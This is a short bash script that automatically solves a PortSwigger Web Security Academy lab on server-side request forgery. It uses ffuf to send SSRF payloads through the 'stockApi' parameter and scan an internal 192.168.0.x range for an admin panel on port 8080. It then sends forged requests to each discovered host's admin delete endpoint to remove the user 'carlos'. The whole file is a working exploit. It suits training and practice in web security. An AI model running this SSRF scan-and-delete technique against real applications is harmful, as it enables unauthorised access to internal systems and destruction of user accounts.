#!/bin/bash
# Automated solution for https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system

numbers=$(seq 0 255)

read -p "Enter the lab URL (e.g., https://example.web-security-academy.net): " lab_url

# Remove all whitespace characters (spaces, tabs, newlines)
lab_url="${lab_url//[$' \t\n']/}"

# Remove trailing slash if it exists
lab_url="${lab_url%/}"

echo Scanning the network...
result=$(
  ffuf -u "$lab_url/product/stock" \
    -X POST \
    -d 'stockApi=http%3A%2F%2F192.168.0.FUZZ%3A8080%2Fadmin' \
    -w <(echo "$numbers") \
    -H 'content-type: application/x-www-form-urlencoded' \
    -fc 500 \
    -s
)

while IFS= read -r line; do
  echo Found 192.168.0.$line
done <<<"$result"

echo Deleting carlos...
while IFS= read -r line; do
  echo "Trying stockApi=http://192.168.0.$line:8080/admin/delete?username=carlos"
  curl "$lab_url/product/stock" \
    -H 'content-type: application/x-www-form-urlencoded' \
    --data-raw "stockApi=http%3A%2F%2F192.168.0.$line%3A8080%2Fadmin%2Fdelete%3Fusername%3Dcarlos"
done <<<"$result"
echo Done!
